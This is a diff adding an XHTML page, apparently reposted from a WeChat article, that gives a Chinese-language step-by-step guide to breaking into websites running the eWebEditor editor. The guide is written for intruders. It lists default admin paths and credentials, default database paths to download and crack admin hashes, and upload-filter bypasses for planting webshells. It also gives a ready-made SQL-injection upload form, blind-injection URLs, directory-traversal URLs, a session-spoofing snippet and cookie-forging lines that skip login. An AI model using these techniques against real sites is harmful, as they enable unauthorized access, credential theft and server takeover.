@@ -1,0 +1,39 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>ewebeditor漏洞利用总结</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>ewebeditor漏洞利用总结</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&amp;mid=2247484007&amp;idx=2&amp;sn=759b4414e81f7f4e66326e7bdfa85c14&amp;chksm=f9e06d3cce97e42ad4a251503f3528fc029a3e7312f0fe6ba843f37e7619ed8c228c4f2b966b&amp;scene=126&amp;sessionid=1681663532#rd">http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&amp;mid=2247484007&amp;idx=2&amp;sn=759b4414e81f7f4e66326e7bdfa85c14&amp;chksm=f9e06d3cce97e42ad4a251503f3528fc029a3e7312f0fe6ba843f37e7619ed8c228c4f2b966b&amp;scene=126&amp;sessionid=1681663532#rd</a></blockquote><p>ewebeditor漏洞利用总结<br/>     先从最基本的记录起！通常入侵ewebeditor编辑器的步骤如下:<br/>1、首先访问默认管理页看是否存在。<br/>        默认管理页地址2.80以前为 ewebeditor/admin_login.asp 以后版本为admin/login.asp (各种语言的大家自己改后缀，本文就以asp来进行说明，下面不再细说了！)<br/>2、默认管理帐号密码！<br/>        默认管理页存在！我们就用帐号密码登陆！默认帐号密码为: admin admin888 ！常用的密码还有admin admin999 admin1 admin000 之类的。</p><p>3、默认数据库地址。<br/>        如果密码不是默认的。我们就访问是不是默认数据库！尝试下载数据库得到管理员密码！管理员的帐号密码，都在eWebEditor_System表段里，sys_UserName Sys_UserPass 都是md5加密的。得到了加密密码。可以去www.cmd5.com www.xmd5.org 等网站进行查询！暴力这活好久不干了！也可以丢国外一些可以跑密码的网站去跑!<br/>       
+ 默认数据库路径为: ewebeditor/db/ewebeditor.mdb 
+常用数据库路径为:ewebeditor/db/ewebeditor.asa ewebeditor/db/ewebeditor.asp 
+ewebeditor/db/#ewebeditor.asa ewebeditor/db/#ewebeditor.mdb ewebeditor/db/!@#ewebeditor.asp ewebeditor/db/ewebeditor1033.mdb 等<br/>        很多管理员常改.asp后缀，一般访问.asp .asa 后缀的 都是乱码！可以用下载工具下载下来，然后更改后缀为.mdb 来查看内容！</p><p>4、说说漏洞基本利用步骤，还以asp为例！<br/>        
+登陆后台以后。选择样式管理，默认编辑器的默认样式都不可以修改的。我们可以从任意样式新建一个样式，然后在图片上传添加可上传后缀。.asa .cer
+ .cdx 等！.asp 过滤过了。但是我们可以用.asaspp 后缀来添加，这样上传文件正好被ewebeditor 
+吃掉asp后缀，剩下.asp 呵呵！代码不详细说了。总之是个很可笑的过滤！同样，如果遇到一个管理员有安全意识的，从代码里，把.asp .asa 
+.cer .cdx 都完全禁止了，我们也可以用.asasaa 后缀来突破。添加完了后缀，可以在样式管理，点击预览，然后上传！<br/>5、默认管理页不存在！<br/>       
+ 在实际入侵过程中，有很多默认的管理页不存在的时候。我们可以直接访问样式管理页面 ewebeditor/admin_style.asp 
+然后用第4步的方式拿webshell。如果样式管理页也不存在的话，我们可以看数据库内的样式表（ewebeditor_style）里面有没有比我们先进去的朋友留下的样式。然后构造上传！具体url如下:
+ eWebEditor/ewebeditor.asp?id=content&amp;style=www</p><p>6、ewebeditor的几个版本存在注入！<br/>        ewebeditor 以前版本都存在注入 ewebeditor/ewebeditor.asp?id=article_content&amp;style=Full_v200 !<br/>添加验证字符串，和管理员字段可以跑出管理员的md5加密密码！<br/>       ewebeditor v2.1.6存在注入，可以用union select 添加上传后缀进行上传！先贴漏洞利用方式！<br/>--------------------------------------------------------------------------------------------------------------<br/>&lt;H3&gt;ewebeditor asp版 2.1.6 上传漏洞利用程序----&lt;/H3&gt;&lt;br&gt;&lt;br&gt;<br/>&lt;form action="http://www.xxx.com/ewebeditor/upload.asp?action=save&amp;type=IMAGE&amp;style=standard'union
+ select 
+S_ID,S_Name,S_Dir,S_CSS,S_UploadDir,S_Width,S_Height,S_Memo,S_IsSys,S_FileExt,S_FlashExt,
+ 
+[S_ImageExt]%2b'|cer',S_MediaExt,S_FileSize,S_FlashSize,S_ImageSize,S_MediaSize,S_StateFlag,S_DetectFromWord,S_InitMode,S_BaseUrl
+ from ewebeditor_style where s_name='standard'and'a'='a" method=post 
+name=myform enctype="multipart/form-data"&gt;<br/>&lt;input type=file name=uploadfile size=100&gt;&lt;br&gt;&lt;br&gt;<br/>&lt;input type=submit value=Fuck&gt;<br/>&lt;/form&gt;<br/>漏洞原因是因为sStyleName变量直接从style中读取，并没有过滤，所以可以包含任意字符！用select在ewebeditor_style表中查找s_name为sStyleName的记录，找不到就提示出错！在sStyleName变量中用union来构造记录，我们可以在sAllowExt中加入"|cer"、"|asa"等！<br/>        另外还有一些版本的ewebeditor的upload.asp文件存在注入漏洞！贴几个注入用的url！信息错误则返回脚本出错的提示，在浏览器左下角！具体利用如下:<br/>ewebeditor/Upload.asp?type=FILE&amp;style=standard_coolblue1'and%20(select%20top%201%20asc(mid(sys_userpass,15,1))%20from%20ewebeditor_system%20)&gt;98%20and%20'1'='1 <br/>注意修改红色部分的字段名、位数、ascii码的值！</p><p>7、目录遍历漏洞！<br/>        这里大概说一下！目录遍历漏洞基本存在于ewebeditor/admin_uploadfile.asp 
+高版本的是ewebeditor/admin/upload.asp 
+文件！这个文件有的不需要登陆验证，有些需要！很多有经验的管理员会把编辑器的目录设置为只读权限,不可修改！这种情况下，唯一可以利用的也就是利用遍历目录功能查看网站文件，比如数据库路径、后台地址、其他的上传地址、最直观的就是别人留下的小马等等！这些都自由发挥了！说下漏洞利用方法！<br/>        漏洞利用方式如下:在上传文件管理页面 随便选择一个上传样式！比如ewebeditor/admin_uploadfile.asp?id=14 在id后面添加&amp;dir=../.. <br/>类似如下:webeditor/admin_uploadfile.asp?id=14&amp;dir=../../../../data/ 可以看到网站数据库的路径！<br/>       另外一个遍历目录的漏洞文件是 ewebeditor/asp/browse.asp</p><p>用方式如下:<br/>http://site/ewebeditor/asp/browse.asp?style=standard650&amp;dir=…././/…././/admin</p><p>这样子就可以看到admin的内容了。构造特殊的dir绕过上面的验证!页面空白的时候查看源代码，就可以看到目录列表了！</p><p>8、session欺骗漏洞！<br/>        适用于一些设置不当的虚拟主机。当旁注得到一个webshell,而目标站存在ewebeditor却不能找到密码的时候可以尝试欺骗进入后台！顺序如下： <br/>         
+ 新建一个.asp文件，内容如下: &lt;%Session("eWebEditor_User") = "123132323"%&gt; 
+然后访问这个文件，再访问ewebeditor/admin_default.asp ！欺骗进入后台！不过很老了！<br/>9、 后台跳过认证漏洞！<br/>        访问后台登陆页面！随便输入帐号密码，返回错误！然后清空浏览器，在地址栏输入<br/>javascript:alert(document.cookie="adminuser="+escape("admin")); <br/>javascript:alert(document.cookie="adminpass="+escape("admin")); <br/>javascript:alert(document.cookie="admindj="+escape("1"));<br/>         然后再清空地址栏，在路径里输入后台登陆后的页面，比如: admin_default.asp admin/default.asp 等。直接进入后台，利用方式见上文！<br/>10、利用远程上传功能！<br/>       
+ 比如s_full样式就存在这个功能，打开编辑页面，然后图片，选择输入url 比如:http://site.com/1.gif.asp ! 
+然后选择上传远程文件！自动就把1.gif.asp 
+保存在上传目录内！注:网上的东西大部分传来传去，这个办法愚弄自己还成！文件的确显示后缀为.asp 
+但是不能访问，因为收集过来的时候自动截止在1.gif了所以后面的.asp等于没有！而且gif的内容就是我们这个url的路径！呵呵，后来又看到一个利用方式！是利用远程搜集的时候执行,我们文件的代码生成另外的小马！</p><p>11、任意文件删除漏洞！<br/>        此漏洞存在于Example\NewsSystem目录下的delete.asp文件中，这是ewebeditor的测试页面，无须登陆可以直接进入！</p><p>12、其他!<br/>        其他说点什么呢！以上的办法都是本人经验和网上搜集！暂时就想到这些了,以后想到了再补全！说说aspx php jsp版本的利用吧！<br/>ASPX版：<br/>受影响文件：eWebEditorNet/upload.aspx<br/>利用方法：添好本地的cer的Shell文件。在浏览器地址栏输入javascript:lbtnUpload.click();就能得到shell。嘿嘿....绕过了限制......成功的上传了ASPX文件....文件默认的上传后保存的地址是eWebEditorNet/UploadFile/现在来看看是否上传成功.....<br/>PHP版本：PhP版本和asp版本利用方式类似！不过php权限较高，不多废话了!<br/>jsp版本：网上有很多jsp的版本，根本没有对上传文件类型进行检测！需要注意的是jsp版本的没有上传按钮！直接选择文件，回车就可以提交了！</p><p><br/></p><p><br/></p><p><br/></p><p>查看更多文章，关注下方二维码</p><p><img data-ratio="1" data-s="300,640" data-src="http://mmbiz.qpic.cn/mmbiz_jpg/p5qELRDe5ickAiax1Nv77rYNEC3sRgfAkw8hAX4rSjibP0FMnud3ZM4f0Jc7nkoCL2t8STuhTbnuxj6W6T8JumElA/640?wx_fmt=jpeg" data-type="jpeg" data-w="258" style="visibility: visible ! important; width: auto ! important; height: auto ! important;" width="auto" src="../Images/60bd80188885b005ab426369f4086902.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/p5qELRDe5ickAiax1Nv77rYNEC3sRgfAkw8hAX4rSjibP0FMnud3ZM4f0Jc7nkoCL2t8STuhTbnuxj6W6T8JumElA/640?wx_fmt=jpeg"/></p><p><br/></p>
+        
+</body>
+</html>
